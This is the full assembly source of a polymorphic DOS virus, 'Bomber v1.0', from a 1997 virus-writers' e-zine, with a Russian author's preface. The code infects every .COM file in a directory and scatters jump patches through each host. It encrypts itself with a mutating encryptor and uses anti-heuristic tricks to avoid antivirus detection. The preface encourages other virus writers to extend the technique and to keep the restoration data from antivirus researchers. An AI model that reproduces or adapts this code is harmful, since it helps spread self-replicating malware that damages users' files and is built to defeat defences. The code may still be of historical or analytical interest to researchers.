COMMENT *
┌────────────────┬──┬────────┬─────────────────────────────┬─────────────────┐
│INFECTED MOSCOW │#1│ JAN'97 │(C)STEALTH Group MoscoW & Co │ one@redline.ru  │
└────────────────┴──┴────────┴─────────────────────────────┴─────────────────┘
┌──────────────────────────────────────────────────┬────────────────────────┐
│ Вирус с пятнами в файле                          │ (C) Beast/SGBishkek    │
└──────────────────────────────────────────────────┴────────────────────────┘


	Это опять я Beast. 
 Сижу за XT'шкой в темнице сырой 
 Вскормленный паскалем викмак молодой . . .
 
 Читаю вирлист Web'овский смотрю OneHalf. Ну там как всегда О Ч Е Н Ь опасный
и все такое прочее. Дошел до того как (O)ne(H)alf (OH) пятна в файле оставляет
и думаю а почему наш брат такое не юзает вот и напИсал небольшую програмку не
уходящую далее C-virus. Так вот сия малая туповатая прога заражает все com в 
директории и раскидывает по ним 10 пятен по 6 байт состоящие из Jump'ов. Проц-
еДУРА есть.для того чтоб изменить количество пятен надо поменять HP (сокращение
от How Patch) на желаемое число. Для востановления в заднице вира есть таблица
необходимая для востановления. Вот ее формат:

Смещение    Длинна   Назначение
   0          1w     Место где наша заплата (на диске. Если в памяти,то +100h)
   2          6b     Та самая запата, а точнее оригинальные байты

 Устанавливайте HP в разумных пределах я советую от 10 до 15 но помните главное
правило каждая заплата требует 10h байт "чистых" вначале и конце. Это к тому,
чтоб небыло заражаемых файлов длиной в 500 байт с HP = 20. Если филе маленького
размера, то вирий может зациклиться т.к. не найдет свободного места в файле.
Да и каждая заплата требует 6 байт. Пока это лишь версия 0.9 так как не делает 
ничего больше Jump'а, но иногда вместо jump'а используется RET, это осложняет
жизнь FUCK'ам, но не очень. Гарантировано что 4 - ый байт это inc si. Т.е. на-
чало проги полиморфно! Для того чтоб изменить количество байт в заплате необхо-
димо поменять константу HB (How Bytes) и поменять в конце вира кол-во резерви-
руемых байт. Начало уже положено. Лед тронулся господа VirMaker'ы !
 Рад буду если мне сообщат о каких либо багах в этом вире. Прощу прощения что
откоментированны лишь нестандартные части вира, так как com-нерезидентус уже
5-ти класники пишут. И те кому надо поймут это. Так же здесь использовалась про-
цедура шифровки части файла из ADinf v1.5. Благодоря которой WEB молчит как пар-
тизан. Этот вирус особено не распрастранялся. Т.к. является лишь демонстрацией
нового (все новое это хорошо забытое старое) способа заражение файлов. Скоро 
ждите заражение EXE оригинальным способом. А по общей характеристике это очеред-
ной полиморфный вирус.

  P.S. Если не вносите серьезных изменений в процедуру заражения, то не меняйте 
и копирайт в процедуре заражения.
  
  P.S. Прячте таблицу востановление шифруйте полиморфите убирайте в другое место
вира, но не даваете ее антивирусникам ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !

*
		.MODEL SMALL
		.CODE
		ORG	100H
BomberCommander:
		JMP	VIRR
		NOP
		DB	'F'
		nop
		nop
		nop
		nop
		nop
		nop
		nop

VIRR:		CALL	$+3
		POP	BP
		SUB	BP,3

                LEA     BX,[BP+NXT_2-VIRR] 	; Попытка антиэвристики
                MOV     BYTE PTR CS:[0FBH],9AH
                MOV     WORD PTR CS:[0FCH],BX 
                MOV     WORD PTR CS:[0FEH],DS 
                mov     ax,0fbh                                  
                push    ax                                    
                ret                                           
NXT_2:                                   
;------------------------------------------------
; Востановление файла
;------------------------------------------------
		LEA	SI,[BP+C1_P+2-VIRR]	; SI=указывает на оригинальные
						; байты для первого patch

		MOV	DI,[SI-2]		; DI=offset first patch - 100h
		MOV	CX,HP			; CX=How Patch

RESTOR_LOOP:	ADD	DI,100H			; DI=offset patch

;		MOVSW				; Repair patch
;		MOVSW

		PUSH	CX
		MOV	CX,HB
		REP	MOVSB
		POP	CX

		MOV	DI,[SI]			; DI=offset next patch-100h
		INC	SI
		INC	SI
		LOOP	RESTOR_LOOP		; Repair next PATCH

		mov	ah,2FH
		INT	21H
		PUSH	BX

		MOV	AH,1AH
		LEA	DX,[BP+BUFFER-VIRR]
		INT	21H

		MOV	AH,4EH
		MOV	CX,100111B
		LEA	DX,[BP+FM-VIRR]
NEXT_FILE:
		INT	21H
		JNC	INFECTION
		MOV	AH,1AH
		POP	DX
		INT	21H
		XOR	AX,AX
		PUSH	AX AX AX AX AX AX AX CS	; востанавливайте сегментные
		POP	ES SI DI BP AX BX CX DX ; регистры ! ! ! !
		RETF
INFECTION:
		CALL	INFECT			; Заразить файл
		MOV	AH,4FH
		LEA	DX,[BP+BUFFER-VIRR]
		JMP	SHORT NEXT_FILE
FM		DB	'*.COM',0

;---------------------------------------------------------
; Заражение
;---------------------------------------------------------

INFECT:		LEA	DX,[BP+BUFFER-VIRR+1EH]
		MOV	AX,3D00H
		INT	21H
		JNC	$+3
		RET
		PUSH	AX AX
		POP	BX
		MOV	AX,1220H
		INT	2FH
		MOV	BL,BYTE PTR ES:[DI]
		MOV	AX,1216H
		INT	2FH
		POP	BX
		MOV	BYTE PTR ES:[DI+2],2
		MOV	AX,ES:[DI+17]
		CMP	AX,60000
		JA	CLOSE
		CMP	AX,2000
		JB	CLOSE
		MOV	AH,3FH
		MOV	CX,4
		LEA	DX,[BP+C1-VIRR]
		INT	21H
		CMP	BYTE PTR CS:[BP+C1-VIRR],'M'
		JE	CLOSE
		CMP	BYTE PTR CS:[BP+C1-VIRR+3],'F'
		JE	CLOSE

		CALL	CONT_INFECT  ; Продолжить заражение
		CALL	CRYPT_ALL_FILE
CLOSE:
		MOV	AH,3EH
		INT	21H
		RET
		db	10,13
		db	'(c) Copyright by Beast.',10,13
		db	'(c) Stealth Group Bishkek.',10,13
		db	'(c) Stealth Group World Wide.',10,13

CONT_INFECT:	MOV	CX,HP
		LEA	SI,[BP+C1_P-VIRR]
		MOV	AX,DS:[DI+17]
		CALL	C_B		; Сгенирировать HP мест для заплаток

		CALL	DO_IT_INFECT	; запИсаться в файл вместе с patch'ами
		RET

DO_IT_INFECT:
		CALL	JMP_WRITE	; Записать заплаты
		CALL	WRITE_BODY	; Записать тело
		RET

copyright	db	'Infection by Beast. v0.91',10,13   ; Не менять ! ! !
		db	'Stealth Group World Wide.',0 ; Не менять ! ! !

WRITE_BODY:	MOV	AX,ES:[DI+17]
		MOV	ES:[DI+21],AX
		MOV	AH,40H
		MOV	DX,BP
		MOV	CX,VL
		INT	21H
		RET

JMP_WRITE:	MOV	CX,HP
		LEA	SI,[BP+C1_P-VIRR]	; ЗаписЯть в тело оригинальные
JMP_LOOP:	MOV	AX,[SI]			; Байты и записЯть в файл запла-
		MOV	ES:[DI+21],AX		; ту
		INC	SI
		INC	SI
		CALL	GET_COMMAND		; Сохранить ор. байты
		MOV	ES:[DI+21],AX

		MOV	AX,[SI+HB]		; Make jmp

		PUSH	AX
		IN	AL,40H
		TEST	AL,1
		POP	AX
		JZ	IT_JMP_C
		XCHG	AL,AH
		INC	AL
		XCHG	AL,AH
		MOV	CS:[RETC-VIRR+1+BP],AX
		PUSH	AX CX DX
		MOV	AH,40H
		LEA	DX,[BP+RETC-VIRR]
		MOV	CX,HB
		INT	21H
		POP	DX CX AX
		JMP	SHORT CONT_SET_JMP
IT_JMP_C:
		SUB	AX,[SI-2]
		SUB	AX,3
		MOV	CS:[BP+JMPC-VIRR+1],AX
		CALL	PUT_COMMAND		; Зарисовать заплату
CONT_SET_JMP:
		ADD	SI,HB
		LOOP	JMP_LOOP		; Следующий
		RET

JMPC		DB	0E9H
		DW	?
		DB	'F'
		db	'Hi'


RETC		LABEL	BYTE
		MOV	AX,0
		DB	'F'
		PUSH	AX
		RET

PUT_COMMAND:	PUSH	AX CX DX

		LEA	DX,[BP+JMPC-VIRR]
		MOV	AH,40H
		JMP	SHORT FIN_DOS_INT

GET_COMMAND:	PUSH	AX CX DX
		MOV	AH,3FH
		MOV	DX,SI
FIN_DOS_INT:
		MOV	CX,HB
		INT	21H
		POP	DX CX AX
		RET

;---------------------------------------------------------
; Генерирование заплат в нужном месте и проверка их
;---------------------------------------------------------

C_B:		MOV	WORD PTR [SI],0	; Адрес 1-ой заплаты всегда 0
		ADD	SI,HB+2
		DEC	CX
		SUB	AX,10H		; AX=file len-10h чтоб заплата близко
					; к концу файла не садилась

CB_LOOP1:	PUSH	AX
ITS_EQUAL:	POP	AX
		PUSH	AX

		MOV	AX,ES:[DI+17]	; look prev. comment 
		SUB	AX,10h

		CALL	GET_RND		; Get random from 0 to AX

		CMP	AX,[SI-HB-2]	; ax=random
		JE	ITS_EQUAL
		CALL	KAK_COCEDU	; Проверка не залазит ли эта заплата
		JC	ITS_EQUAL	; на другие

		MOV	[SI],AX		; Next
		ADD	SI,HB+2
		POP	AX
		LOOP	CB_LOOP1

		MOV	AX,ES:[DI+17]	; Последняя HP+1 заплата это вир
		MOV	[SI],AX		; и находится он в конце файла

		RET

KAK_COCEDU:	PUSH	CX AX SI
		PUSH	AX
		MOV	AX,HP
		SUB	AX,CX
		MOV	CX,AX

;		dec	cx

		POP	AX
		LEA	SI,[BP+C1_P+2+HB-VIRR]

COCEDU_LOOP:	SUB	AX,[SI-HB-2]
		CMP	AX,10H
		JA	$+5
		STC
		JMP	SHORT EXIT_COCEDU
		CMP	AX,0FFE0H
		JB	$+5
		STC
		JMP	SHORT EXIT_COCEDU
		ADD	AX,[SI-2-HB]
		ADD	SI,2+HB
		LOOP	COCEDU_LOOP
		CLC
EXIT_COCEDU:
		POP	SI AX CX
		RET


GET_RND:	PUSH	BX CX
		MOV	BX,AX

		IN	AX,40H
		MOV	CX,AX
GET_AG:
		IN	AX,40H
		CMP	AX,CX
		JE	GET_AG
		SUB	AX,CX
		CMP	AX,100
		JB	GET_AG
		ADD	AX,CX
NXT:
		SUB	AX,BX

;ROL	AX,CL
;add	ax,cx
		CMP	AX,BX
		JAE	NXT
		POP	CX BX
		RET

CRYPT_ALL_FILE:
		CALL	MUTATION    ; Замутировать шифровщик и расшифровщик

		IN	AX,40H
		MOV	WORD PTR DS:[WITH_AX+1-VIRR+bp],AX
		MOV	AX,VL-4
		MOV	DS:[ENCRYPT-VIRR+1+BP],AX
		MOV	AX,VL-3
		MOV	DS:[EN_JMP+1-VIRR+BP],AX
		MOV	AX,ES:[DI+17]
		PUSH	AX
		SUB	AX,VL-100H
		MOV	WORD PTR DS:[WITH_DI+1-VIRR+BP],AX
		DEC	AH
		MOV	ES:[DI+21],AX
		mov	cx,ax
		POP	AX
		PUSH	AX
		PUSH	CX
		MOV	CX,4
		MOV	AH,3FH
		LEA	DX,[VIR_BYTES-VIRR+BP]
		int	21h
		POP	CX
		POP	AX
		PUSH	CX
		MOV	AX,ES:[DI+17]
		MOV	ES:[DI+21],AX
		MOV	CX,EL
		LEA	DX,[ENCRYPT-VIRR+BP]
		MOV	AH,40H
		int	21h
		POP	AX

		MOV	Es:[DI+21],AX
		MOV	AH,40H
		MOV	CX,4
		LEA	DX,[EN_JMP-VIRR+BP]
		int	21h

		mov	cx,vl-4
		mov	ax,ds:[with_ax-virr+1+BP]   ; в AX случайное значение
CRYPT_LOOP:
		CALL	READ_BYTE		 ; прочитать байт проги
		LEA	SI,[REZ-VIRR+BP]

;  Н Е   М Е Н Я Т Ь   К О М А Н Д Ы 

		SUB	BYTE PTR [SI],CH
		SUB	BYTE PTR [SI],CL
		SUB	BYTE PTR [SI],AH
		SUB	BYTE PTR [SI],AL

		ADD	BYTE PTR [SI],CH
		ADD	BYTE PTR [SI],CL
		ADD	BYTE PTR [SI],AH
		ADD	BYTE PTR [SI],AL

		XOR	BYTE PTR [SI],CH
		XOR	BYTE PTR [SI],CL


		XOR	BYTE PTR [SI],AH
CRYPT_DATA:
		XOR	BYTE PTR [SI],AL

		CALL	WRITE_BYTE	; отъезд назад и запись байта

CRYPT_DATA1:	ADD	AL,CL

;		ADD	AL,AH
;		ADD	AL,AL
;		ADD	AL,AH

		ADD	AH,CL
;		ADD	AH,AH
;		ADD	AH,AL
;		ADD	AH,AH
;
;		XOR	AL,AH
;		XOR	AL,CL
;		XOR	AL,CH
;
;		XOR	AH,AL
;		XOR	AH,CL
;		XOR	AH,CH
;
;		ROL	AL,CL
;		ROL	AH,CL
;		XCHG	AH,AL
;		ROR	AH,CL
;		ROR	AL,CL
;
		LOOP	CRYPT_LOOP
		RET
;---------------------------------------------------
; Расшифровщик файла
;---------------------------------------------------
ENCRYPT:	MOV	CX,0
		CALL	$+3
		POP	SI
		SUB	SI,6

;-------------------------------------------------------------------------------
; Анти-эвристика передать управление метке NXT_C и запихнуть в стек CS и 100h
;-------------------------------------------------------------------------------
		LEA	BX,[SI+NXT_C-ENCRYPT]
		MOV	BYTE PTR CS:[0FBH],9AH ; Far call 
		MOV	WORD PTR CS:[0FCH],BX
		MOV	WORD PTR CS:[0FEH],DS
		mov	ax,0fbh
		push	ax
		ret
NXT_C:
		ADD	SI,VIR_BYTES-ENCRYPT

WITH_DI:	MOV	DI,100H
		POP	BP
		PUSH	DI
		MOVSW
		MOVSW
;		MOV	DI,104H

WITH_AX:	MOV	AX,0
		PUSH	AX
		JMP	OUT_COPY
		
		DB	'[Bomber v1.0] by Beast. Stealth Group World Wide.'

OUT_COPY:
;-------------------------------------------------------------------------------
; Анти - эвристика
;-------------------------------------------------------------------------------
		SUB	AX,AX
		mov	es,ax
		mov	es:[0],ax
		cmp	es:[0],ax
		je	$+4
		int	20h
;-------------------------------------------------------------------------------
; Анти - эвристика
;-------------------------------------------------------------------------------

		mov	ax,0e0e0h
		int	21h
		or	al,0
		jz	$+4
		int	20h
;-------------------------------------------------------------------------------
; Анти - эвристика
;-------------------------------------------------------------------------------

		in	al,40h
		or	al,al
		jnz	$+4
		int	20h

		POP	AX
		push	cs
		pop	es
ENCRYPT_LOOP:

;  Н Е   М Е Н Я Т Ь   К О М А Н Д Ы

DECRYPT_DATA:	XOR	BYTE PTR [DI],AL
		XOR	BYTE PTR [DI],AH
		XOR	BYTE PTR [DI],CL
		XOR	BYTE PTR [DI],CH

		SUB	BYTE PTR [DI],AL
		SUB	BYTE PTR [DI],AH
		SUB	BYTE PTR [DI],CL
		SUB	BYTE PTR [DI],CH

		ADD	BYTE PTR [DI],AL
		ADD	BYTE PTR [DI],AH
		ADD	BYTE PTR [DI],CL
		ADD	BYTE PTR [DI],CH


DECRYPT_DATA1:	ADD	AL,CL
;		ADD	AL,AH
;		ADD	AL,AL
;		ADD	AL,AH
;
		ADD	AH,CL
;		ADD	AH,AH
;		ADD	AH,AL
;		ADD	AH,AH
;
;		XOR	AL,AH
;		XOR	AL,CL
;		XOR	AL,CH
;
;		XOR	AH,AL
;		XOR	AH,CL
;		XOR	AH,CH
;
;		ROL	AL,CL
;		ROL	AH,CL
;		XCHG	AH,AL
;		ROR	AH,CL
;		ROR	AL,CL

		INC	DI
		LOOP	ENCRYPT_LOOP
		RETF

VIR_BYTES	DB	90h,90h,90H,0C3h
EL		EQU	$-ENCRYPT

EN_JMP:		DB	0E9h
		DW	?
		DB	'F'
REZ		DB	?

READ_BYTE:	push	ax cx		; используется в шифровке
		MOV	AH,3FH
		JMP	SHORT FIN_DOS_OP

WRITE_BYTE:	PUSH	AX CX
		MOV	AH,40H
		DEC	WORD PTR ES:[DI+21]
FIN_DOS_OP:
		LEA	DX,[REZ-VIRR+BP]
		MOV	CX,1
		int	21h
		pop	cx ax
		RET

MUTATION:	PUSH	SI DI BX
		MOV	WORD PTR DS:[UP_RND-VIRR+BP],11
		MOV	WORD PTR DS:[DOWN_RND-VIRR+BP],0
		LEA	SI,[DECRYPT_DATA-VIRR+BP]
		MOV	DI,SI
		CALL	GET_RND2	; Получить случайное число
		SHL	BX,1
		PUSH	BX
		ADD	SI,BX
		CALL	GET_RND2	; и получить второе и в соот-
		SHL	BX,1		; ветствии с ними команды в шифровшике
		PUSH	BX		; и расшифровщике
		ADD	DI,BX
		CALL	XCHG_SI_DI
		
		LEA	DI,[CRYPT_DATA-VIRR+BP]
		MOV	SI,DI ;CRYPT_DATA-VIRR-2
		POP	BX
		SUB	DI,BX
		POP	BX
		SUB	SI,BX
		CALL	XCHG_SI_DI

		POP	BX DI SI
		RET

UP_RND		DW	?
DOWN_RND	DW	?

GET_RND2:	IN	AX,40H
		MOV	BX,WORD PTR DS:[UP_RND-VIRR+BP]
		SUB	BX,WORD PTR DS:[DOWN_RND-VIRR+BP]

CONT_RND:	SUB	AX,BX
		CMP	AX,BX
		JA	CONT_RND
		MOV	BX,AX
		RET

XCHG_SI_DI:	PUSH	WORD PTR DS:[DI] ; Подобие команды
		PUSH	WORD PTR DS:[SI] ; xchg word ptr [si],word ptr [di]
		POP	WORD PTR DS:[DI]
		POP	WORD PTR DS:[SI]
		RET

HP		EQU	10		; How patch
HB		EQU	6
C1_P		DW	0
C1		DB	0C3h,90h,90h,90H,90H

		db	hp-1 dup (0,0,90h,90h,90h,0c3h,90H,90H)
		DW	0

VL		EQU	$-VIRR
BUFFER:
		END	BomberCommander
